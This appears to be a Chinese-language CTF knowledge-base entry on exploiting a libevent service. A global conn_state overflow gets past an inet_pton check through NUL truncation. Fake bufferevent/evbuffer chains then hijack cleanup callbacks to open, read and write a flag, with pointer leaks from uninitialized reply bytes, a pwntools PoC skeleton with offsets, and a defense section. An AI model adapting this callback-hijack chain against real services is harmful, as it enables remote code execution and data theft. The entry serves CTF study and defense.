---
id: binary-pwn-libevent-evbuffer-global-overflow-fake-chain-orw
title: libevent 服务全局 conn_state 溢出：伪造 bufferevent/evbuffer/reference chain，借 cleanup 回调链 open/read/write
type: scenario
domain: binary
path: binary/pwn
technique: libevent-evbuffer-global-overflow-fake-cleanup-chain
aliases:
- webpwn evbuffer
- SUCTF webpwn
- libevent 伪造 bufferevent
- evbuffer_add_reference cleanup 链
- conn_state 全局溢出
- inet_pton NUL 截断绕过
- fake reference chain
tags:
- pwn
- libevent
- evbuffer
- bufferevent
- global-overflow
- bss
- callback-hijack
- orw
- network-service
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V159
  verified_at: '2026-11-06T07:38:57+08:00'
  notes: 已对照原文核对：TCP8888/UDP8889、全局conn_state、inet_pton NUL截断+memcpy(ctx,buf,len)溢出、+0x20 use_bev/+0x28 bev、bufferevent_get_output=*(bev+0x118)、evbuffer_add_reference清理空reference chain触发cleanup(arg1,arg2,arg3)、fake chain字段布局、reply hostname残留泄露libevent/PIE、open/read/write链与fd8/9均与原文exp一致。未验证点：PoC未在本机复跑；偏移与fd编号依赖目标环境；原文未给受影响版本区间，未设置versions；原文未提供sources/source_url。
---

## 一句话结论

服务端把 `recvfrom`/`bufferevent` 收到的数据用 `memcpy(ctx, buf, len)` 写进 `.bss` 上的全局 `conn_state`，且只靠 `inet_pton` 校验开头是否为合法 IPv4；在 `"1.2.3.4\0"` 后接溢出数据即可覆盖同一全局结构中的 `use_bev` 与 `bev` 指针。把 `bev` 指向伪造的 bufferevent、再借 `evbuffer_add_reference` 清理尾部空 reference chain 的行为，就能让一串 fake chain 的 cleanup 回调依次执行 `open("flag")`、`read`、`write(sock_fd)`，把 flag 写回当前 TCP 连接。

## 原理

- **服务架构**：程序用 libevent 同时监听 TCP 8888 和 UDP 8889。TCP 走 `evconnlistener_new_bind` + `bufferevent_socket_new`，`accept_cb` 设置 `g_tcp_ctx.use_bev = 1` 并保存 `g_tcp_ctx.bev`；UDP 走 `event_new(g_event_base, fd, 18, deal, &g_udp_ctx)` + `recvfrom`/`sendto`。两套路径共用一个 `conn_state` 结构和同一个处理函数。
- **溢出点**：处理函数把收到的 `buf[len] = 0`，然后 `malloc(0x50)` 一个 reply，先 `inet_pton(AF_INET, buf, reply+4)` 校验；校验通过后 `memcpy(ctx, buf, len)`，其中 `ctx` 是回调参数——TCP 路径下就是 `&g_tcp_ctx`。`len` 是攻击者实际发送的字节数（最大约 0x3ff），远大于 `conn_state` 结构本身的尺寸，于是写穿 `.bss` 中的全局状态。
- **校验为什么能绕过**：`inet_pton` 只解析到第一个 NUL 为止；payload 以 `1.2.3.4\0` 开头即可返回 1，而 `memcpy` 使用的是带长度的 `len`，NUL 后面的溢出字节照样被复制。也就是说“格式校验”和“长度处理”用了两套不同的边界。
- **目标字段**：`conn_state` 中 `use_bev` 位于 +0x20、`bev` 位于 +0x28、fd 位于 +0x30。payload 在对应偏移写 `1` 和 `fake_bev` 后，同一个处理函数紧接着检查 `ctx->use_bev == 1 && ctx->bev`，进入 `bufferevent_get_output(ctx->bev)` 分支，而不是 `sendto` 分支。
- **为什么伪造 bev 就能控制输出对象**：该版本 libevent 的 `bufferevent_get_output(bev)` 实现很简单，本质是 `return *(bev + 0x118)`。因此不需要伪造完整的 `bufferevent`，只要在 fake_bev+0x118 放一个 fake `evbuffer` 指针；这个 fake evbuffer 再被传给 `evbuffer_add_reference`。
- **cleanup 链**：`evbuffer_add_reference` 在插入新 reference 之前会先清理尾部的空 reference chain。每个 chain 上保存了 `cleanup(data, len, extra)` 回调及参数；把 fake evbuffer 的链指针指向一串伪造 chain，就能把“清理”变成连续的三参数函数调用：`rdi = arg1`、`rsi = arg2`、`rdx = arg3`，即 `func(arg1, arg2, arg3)`。
- **fake chain 的关键字段**：`next` 指向下一条 chain；`off = 0`、`flags = 0xC`、`refcnt = 1` 让 libevent 把它当成“需要 cleanup 的空 reference chain”；`arg1/arg2/arg3` 对应 cleanup 的三个参数；`func` 填 libevent 的 PLT `open`/`read`/`write`。在 chain 前放若干 `size = 0x51` 的假 chunk 头，是为了让链上的指针看起来像真实堆块，增加布局稳定性。
- **泄露**：reply 的 `hostname` 是 64 字节，但 `gethostname` 只写入实际主机名长度，剩余字节保留栈上残值；reply 固定发送 0x50 字节，最后 8 字节（数据偏移 0x48..0x4f）会带出栈上的 libevent/PIE 指针。TCP 与 UDP 调用路径的栈布局不同，分别泄露 libevent 基址和 PIE 基址。
- **最终写回**：控制器把 `open("flag")` 的返回值（fd 9）作为下一条 chain 的 `arg1`，`read(9, chain0, 0x40)` 把 flag 读进链内存；再 `write(sock_fd=8, chain0, 0x40)` 写回当前 TCP 连接。第二条 read 用 `open_fd+1`，第二条 write 仍写回 sock_fd，用于读第二段/确认。fd 编号是目标进程的实测值（持久连接 8、open 返回 9），不同环境需重调。

## 触发条件

- 目标程序使用 libevent 的 bufferevent/evbuffer，且处理函数把带长度的用户数据 `memcpy` 到 .bss 上的全局连接状态，长度校验与 `inet_pton` 的字符串校验不一致。
- 全局状态中 `use_bev`/`bev` 等字段可被同一 overflow 覆盖，且处理函数在 overflow 之后立即使用这些字段。
- 目标 libevent 版本的 `bufferevent_get_output` 是 `*(bev + 0x118)` 这类简单取字段实现；不同版本需重新核对偏移。
- 能通过 TCP 保持一个连接（用于最终写回），并能通过 TCP/UDP 探测泄露 libevent 与 PIE 基址。
- 目标允许 open/read/write，且 flag 路径已知或可枚举。

## 利用步骤

1. 建立 TCP 连接，发送 `1.1.1.1`，读取 0x50 字节 reply；取 `data[0x48:0x50]` 减 libevent 泄露偏移（原文 0x13B1A），得到 libevent 基址。
2. 发送 UDP `2.2.2.2`，同样取 `data[0x48:0x50]` 减 PIE 泄露偏移（原文 0x1619），得到 PIE 基址。
3. 在 PIE 的 `.bss` 上布置 fake 对象：`fake_bev`、`fake_evbuffer`、`slot`、路径字符串、6 个假 chunk 头，以及 5 条 fake chain。
4. 计算覆盖起点为 `g_tcp_ctx`（原文 0x4078）；payload 开头写 `1.2.3.4\0` 通过 `inet_pton`，在偏移 +0x20 写 1、+0x28 写 `fake_bev`。
5. 设置 `fake_bev + 0x118 = fake_evbuffer`；`fake_evbuffer + 0x10 = slot`；`slot = chain0`，chain0..chain4 通过 `next` 串起来。
6. 每条 chain 填 `off=0`、`flags=0xC`、`refcnt=1`，并设置 `arg1/arg2/arg3/func`：chain0 `open(path_addr,0,0)`；chain1 `read(9, chain0, 0x40)`；chain2 `write(8, chain0, 0x40)`；chain3 `read(10, chain1, 0x40)`；chain4 `write(8, chain1, 0x40)`。
7. 在保持的 TCP 连接上发送完整 payload；`core_handler` 把 payload 复制进 `g_tcp_ctx`，随后走 `bufferevent_get_output(fake_bev)` → `evbuffer_add_reference(fake_evbuffer, ...)`，触发 cleanup 链。
8. 读取 TCP 连接返回的数据，即 flag。

## PoC

原文给出完整 pwntools 脚本；下面为关键布局骨架（偏移与 fd 编号必须按目标重调）：

```python
base = pie_base + 0x4078          # g_tcp_ctx
fake_bev = pie_base + 0x40C0
fake_ev  = pie_base + 0x41E0
slot     = pie_base + 0x4260
path     = pie_base + 0x4450
hdr = [pie_base + x for x in (0x4270, 0x42C0, 0x4310, 0x4360, 0x43B0, 0x4400)]
chain = [h + 0x10 for h in hdr]

out = bytearray(0x400)

def put(buf, addr, data):         # addr 是绝对地址，按 base 换算成 payload 偏移
    off = addr - base
    end = off + len(data)
    if end > len(buf):
        buf.extend(b"\x00" * (end - len(buf)))
    buf[off:end] = data

out[:9] = b"1.2.3.4\x00"          # inet_pton 只看 NUL 前
# 覆盖 g_tcp_ctx：+0x20=use_bev，+0x28=bev
put(out, base + 0x20, p32(1))
put(out, base + 0x28, p64(fake_bev))
put(out, fake_bev + 0x118, p64(fake_ev))
put(out, fake_ev + 0x10, p64(slot))
put(out, slot, p64(chain[0]))

for h in hdr:                     # 假 chunk 头，size=0x51
    put(out, h + 0x00, p64(0))
    put(out, h + 0x08, p64(0x51))

def chain_set(i, nxt, arg1, func, arg2, arg3):
    c = chain[i]
    put(out, c + 0x00, p64(nxt))
    put(out, c + 0x08, p64(arg2))
    put(out, c + 0x10, p64(0))
    put(out, c + 0x18, p64(0))    # off = 0
    put(out, c + 0x20, p32(0xC))  # flags
    put(out, c + 0x24, p32(1))    # refcnt
    put(out, c + 0x28, p64(arg1))
    put(out, c + 0x30, p64(func))
    put(out, c + 0x38, p64(arg3))

chain_set(0, chain[1], path,             libevent_plt_open,  0, 0)
chain_set(1, chain[2], 9,                libevent_plt_read,  chain[0], 0x40)
chain_set(2, chain[3], 8,                libevent_plt_write, chain[0], 0x40)
chain_set(3, chain[4], 10,               libevent_plt_read,  chain[1], 0x40)
chain_set(4, 0,        8,                libevent_plt_write, chain[1], 0x40)
put(out, path, b"flag\x00")

tcp.send(bytes(out))              # 保持 pwn1 的 TCP 连接
```

原文实测可把 `flag` 内容从当前 TCP 连接写回；PoC 未在本会话执行。

## 变体与关联

- **UDP → TCP 联动**：UDP 路径的 ctx 是 `g_udp_ctx`（原文 0x4040），与 `g_tcp_ctx`（0x4078）仅隔 0x38 字节；从 UDP 溢出也能覆盖 `g_tcp_ctx.use_bev/bev`，再发一个 TCP 包触发。原文最终选择直接在 TCP 包内覆盖自身，路径更短。
- **不同 libevent 版本**：`bufferevent_get_output` 的返回字段、evbuffer 结构、chain 的 flags/refcnt 语义都可能变化；必须按目标 `.so` 反汇编和调试重新核对偏移与字段。
- **cleanup 链替代目标**：除了 open/read/write，也可把 `func` 指向 `system` 或 one-gadget；若 seccomp 只允许 ORW，则用本例的链式多调用。
- **泄露替代**：若 hostname 尾部被初始化，可从 reply 的其它未初始化字段、堆指针或协议回显寻找泄露；没有泄露时可用 partial overwrite。
- 关联：[[binary-pwn-heap-cgi-vpn-strcpy-custom-ptr-callback-hijack]]（另一类自定义回调/指针劫持）、[[binary-pwn-heap-uaf-function-pointer-hijack]]（回调函数指针劫持基础）。

## 检测与防御

- **长度边界**：对 `memcpy` 使用实际结构体大小/剩余空间，不要用用户给出的 `len` 直接复制到固定全局结构；`inet_pton` 的字符串校验不能替代长度校验。
- **全局状态隔离**：把连接状态放到堆上按连接分配，避免多个连接/协议共用同一 `.bss` 结构；对 `use_bev`/`bev` 等控制字段做完整性校验。
- **libevent 使用**：不要把用户可控指针或未校验的 `bev` 传入 `bufferevent_get_output`；升级 libevent，关注 evbuffer chain 的 cleanup 回调安全。
- **检测**：监控 `.bss` 中连接状态结构被超长网络包覆盖、`bufferevent_get_output` 返回非预期指针、以及进程内出现 open/read/write 的异常 syscall 链；对同一连接上“先泄露栈指针再发超长 payload”的序列告警。
- **缓解**：开启 PIE/Full RELRO 只能增加泄露成本；关键还是修复长度校验和全局状态设计。
